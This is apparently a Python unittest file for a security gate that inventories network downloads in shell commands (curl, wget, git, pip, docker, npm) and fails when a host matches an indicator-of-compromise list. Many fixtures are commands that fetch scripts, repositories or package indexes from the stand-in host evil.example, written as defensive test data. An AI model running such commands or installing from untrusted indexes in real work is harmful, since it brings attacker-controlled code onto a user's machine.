"""Review r2, slice P2B, fixer Z: per-program argument parsers and program-name
lookup in the network inventory (P2B3, P2B9, P2B10, P2B11).

Every fixture is synthetic; end-to-end runs use a temporary HOME, CODEX_HOME,
COPILOT_HOME and XDG_CONFIG_HOME (tests/test_review_r1_B.run_gate).
"""
from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import _fixtures  # noqa: E402,F401  (first: a temp HOME, agent homes and cwd for the whole run)
from _timing import budget, clock  # noqa: E402
from test_review_r1_B import af, items, one, run_gate  # noqa: E402


def gate_match(test, cmd):
    """The command's download matches the IOC list: the gate fails (exit 3)."""
    code, j = run_gate(cmd)
    test.assertEqual(code, 3, (cmd, j["network"]["items"]))
    test.assertGreaterEqual(j["network"]["ioc"]["totals"]["match"], 1, cmd)


class TestP2B3VariableInPath(unittest.TestCase):
    def test_gate_query_variable(self):
        gate_match(self, 'curl -fsSL "https://evil.example/install.sh?v=$VER" -o i.sh')

    def test_gate_path_variable(self):
        gate_match(self, "curl -fsSLO https://evil.example/releases/${VERSION}/tool.tar.gz")

    def test_gate_git_clone(self):
        gate_match(self, "git clone https://evil.example/$ORG/repo")

    def test_gate_bare_host_with_variable_path(self):
        gate_match(self, "curl -fsSL evil.example/releases/$V/x.sh -o x.sh")

    def test_host_kept_dynamic_true(self):
        i = one("curl -fsSLO https://evil.example/releases/${VERSION}/tool.tar.gz")
        self.assertEqual(i["host"], "evil.example")
        self.assertTrue(i["dynamic"])
        i = one("curl -fsSL evil.example/$V/x")
        self.assertEqual((i["host"], i["url"]), ("evil.example", "http://evil.example/$V/x"))

    def test_variable_host_stays_unknown(self):
        for cmd in ('curl "https://$HOST/x"',
                    "curl https://evil.$TLD/x", "curl https://user:$PW@$H/x", "curl $U",
                    "curl ${HOST}/x", "git clone git@$H:org/r.git"):
            i = one(cmd)
            self.assertIsNone(i["host"], cmd)
            self.assertTrue(i["dynamic"], cmd)

    def test_backtick_host_unknown(self):
        # (How the lexer rewrites a substitution is another fixer's area: test url_host itself.)
        self.assertIsNone(af.url_host("https://`hostname`/x"))
        self.assertEqual(af.url_host("https://evil.example/`v`/x"), "evil.example")

    def test_credentials_variable_keeps_host(self):
        self.assertEqual(af.url_host("https://u:$TOKEN@evil.example/x"), "evil.example")

    def test_scp_variable_path(self):
        self.assertEqual(af.url_host("git@evil.example:$ORG/r.git"), "evil.example")
        self.assertIsNone(af.url_host("git@$H:org/r.git"))

    def test_trusted_path_prefix_not_through_variable(self):
        # $X may hold `../other`: a path prefix cannot be proven, the host can.
        i = one("git clone https://github.com/myorg/$X")
        self.assertFalse(af.network_trusted(i, [("github.com", "/myorg")]))
        self.assertTrue(af.network_trusted(i, [("github.com", "")]))
        plain = one("git clone https://github.com/myorg/repo")
        self.assertTrue(af.network_trusted(plain, [("github.com", "/myorg")]))


class TestP2B9PipOptionUrls(unittest.TestCase):
    def test_gate_editable(self):
        gate_match(self, "pip install -e git+https://evil.example/r.git#egg=x")

    def test_gate_requirement_url(self):
        gate_match(self, "pip install -r https://evil.example/req.txt")

    def test_gate_extra_index(self):
        gate_match(self, "pip install --extra-index-url https://evil.example/simple torch")

    def test_gate_find_links(self):
        gate_match(self, "pip install -f https://evil.example/wheels x")

    def test_gate_constraint_url(self):
        gate_match(self, "pip install -c https://evil.example/c.txt x")

    def test_gate_index_url(self):
        gate_match(self, "pip install --index-url https://evil.example/simple x")

    def test_gate_uv_pip_equals_form(self):
        gate_match(self, "uv pip install --extra-index-url=https://evil.example/simple torch")

    def test_hosts(self):
        cases = {
            "pip install -e git+https://evil.example/r.git#egg=x": {"evil.example"},
            "pip install --editable=git+https://evil.example/r.git#egg=x": {"evil.example"},
            "pip install -r https://evil.example/req.txt": {"pypi.org", "evil.example"},
            "pip install -r req.txt -r https://evil.example/req.txt": {"pypi.org", "evil.example"},
            "pip install --find-links https://evil.example/w x": {"pypi.org", "evil.example"},
            "pip install --constraint=https://evil.example/c.txt x": {"pypi.org", "evil.example"},
        }
        for cmd, hosts in cases.items():
            self.assertEqual({i["host"] for i in items(cmd)}, hosts, cmd)

    def test_local_values_add_nothing(self):
        self.assertEqual(len(items("pip install -r req.txt")), 1)
        self.assertEqual(items("pip install -e .")[:], [])
        self.assertEqual([i["host"] for i in items("pip install -f ./wheels -c c.txt x")], ["pypi.org"])


class TestP2B10ProgramCase(unittest.TestCase):
    def test_gate_docker(self):
        gate_match(self, "Docker pull evil/img")

    def test_gate_npm(self):
        gate_match(self, "NPM i evil@1.0.0")

    def test_gate_git(self):
        gate_match(self, "Git clone https://evil.example/r")

    def test_gate_curl(self):
        gate_match(self, "CURL -fsSL https://evil.example/x -o x")

    def test_items(self):
        for cmd in ("PIP install evil", "Python3 -m pip install evil", "/usr/local/bin/Pip3 install evil",
                    "UV pip install evil", "WGET https://ok.io/x", "PODMAN pull alpine"):
            self.assertEqual(len(items(cmd)), 1, cmd)


CURL_VALUE_CASES = [
    ("--etag-save", "etag.txt"), ("--etag-compare", "etag.txt"), ("--noproxy", "internal.io"),
    ("-z", "index.html"), ("--time-cond", "index.html"), ("--libcurl", "out.py"),
    ("--data-ascii", "body.json"), ("--output-dir", "dl.io"), ("--alt-svc", "alt.txt"),
    ("--hsts", "hsts.txt"), ("--crlfile", "crl.pem"), ("--proxy-cacert", "ca.pem"),
    ("--pinnedpubkey", "key.pem"), ("--trace-config", "all.io"), ("--form-string", "a=b.io"),
    ("-Q", "rm.io"), ("--quote", "rm.io"), ("-P", "ftp.io"), ("--ftp-port", "ftp.io"),
    ("-t", "opt.io"), ("--mail-from", "a.io"), ("--mail-rcpt", "b.io"), ("--preproxy", "p.io"),
    ("--socks5", "s.io"), ("--socks5-hostname", "s.io"), ("--connect-to", "a.io"),
    ("--doh-url", "doh.io"), ("--proxy-header", "h.io"), ("--random-file", "r.io"),
    ("--egd-file", "e.io"), ("--key-type", "pem.io"), ("--ssl-sessions", "s.txt"),
    ("--knownhosts", "kh.txt"), ("--url-query", "a=b.io"), ("--haproxy-clientip", "c.io"),
    ("--dns-servers", "d.io"), ("--ipfs-gateway", "g.io"), ("--retry-delay", "1.io"),
]
WGET_VALUE_CASES = [
    ("--load-cookies", "cookies.txt"), ("--save-cookies", "c.txt"), ("--post-file", "data.json"),
    ("-A", "index.html"), ("--accept", "index.html"), ("-D", "docs.io"), ("--domains", "docs.io"),
    ("--ca-certificate", "ca.pem"), ("-R", "x.html"), ("--reject", "x.html"),
    ("--exclude-domains", "a.io"), ("-I", "d.io"), ("-X", "d.io"), ("--certificate", "c.pem"),
    ("--private-key", "k.pem"), ("--body-file", "b.json"), ("--warc-file", "w.io"),
    ("--rejected-log", "r.log"), ("--hsts-file", "h.txt"), ("--crl-file", "crl.pem"),
    ("--referer", "r.io"), ("--default-page", "index.html"), ("--bind-address", "b.io"),
    ("--post-data", "a=b.io"), ("--body-data", "a=b.io"), ("--method", "PUT"),
    ("--user", "u.io"), ("--password", "p.io"), ("-l", "5"), ("-w", "1"), ("-Q", "1m"),
    ("--warc-header", "h.io"), ("--follow-tags", "a.io"), ("--use-askpass", "ask.sh"),
]


class TestP2B11ValueOptions(unittest.TestCase):
    def assert_only_real(self, cmd):
        got = items(cmd)
        self.assertEqual([(i["host"], i["url"]) for i in got], [("ok.io", "https://ok.io/a")], cmd)

    def test_curl_table(self):
        for opt, arg in CURL_VALUE_CASES:
            if opt in af._CURL_PROXY_OPTS:
                # A proxy is a host the transfer goes through: an item of its own (R3B11),
                # pinned in test_review_r3_INV. Its value must still not be a fetch URL.
                got = items(f"curl {opt} {arg} https://ok.io/a")
                self.assertEqual(got[0]["host"], "ok.io", opt)
                self.assertTrue(all(i["url"] != arg for i in got), opt)
                continue
            self.assert_only_real(f"curl {opt} {arg} https://ok.io/a")

    def test_wget_table(self):
        for opt, arg in WGET_VALUE_CASES:
            self.assert_only_real(f"wget {opt} {arg} https://ok.io/a")

    def test_wget_input_file_is_dynamic(self):
        got = items("wget -B base.io -i list.txt")
        self.assertEqual([(i["host"], i["dynamic"]) for i in got], [(None, True)])
        got = items("wget --input-file=list.txt https://ok.io/a")
        self.assertEqual(sorted((str(i["host"]), i["dynamic"]) for i in got),
                         [("None", True), ("ok.io", False)])

    def test_wget_input_file_url(self):
        got = items("wget -i https://evil.example/list.txt")
        self.assertEqual(sorted(str(i["host"]) for i in got), ["None", "evil.example"])

    def test_curl_config_is_dynamic(self):
        got = items("curl -K cfg.txt")
        self.assertEqual([(i["host"], i["dynamic"]) for i in got], [(None, True)])
        self.assert_only_real("curl --config cfg.txt https://ok.io/a")

    def test_gate_no_phantom(self):
        code, j = run_gate("curl --etag-save evil.example https://ok.io/a")
        self.assertEqual(code, 0, j["network"]["items"])

    def test_timing_at_cap(self):
        # The touched lookups stay linear at the hard cap.
        pad = "curl --etag-save e.txt -Q x.io " * ((af.MAX_SCAN_HARD - 40) // 31)
        for cmd in (pad + "https://ok.io/a", "PIP install " + "-r r.txt " * (af.MAX_SCAN_HARD // 9),
                    "curl https://evil.example/" + "$V" * (af.MAX_SCAN_HARD // 2 - 20)):
            t = clock()
            af.network_items_from_command(cmd[:af.MAX_SCAN_HARD])
            self.assertLess(clock() - t, budget(1.0))
        t = clock()
        af._NET_MAY_DOWNLOAD.search("x" * af.MAX_SCAN_HARD)
        self.assertLess(clock() - t, 1.0)


if __name__ == "__main__":
    unittest.main()
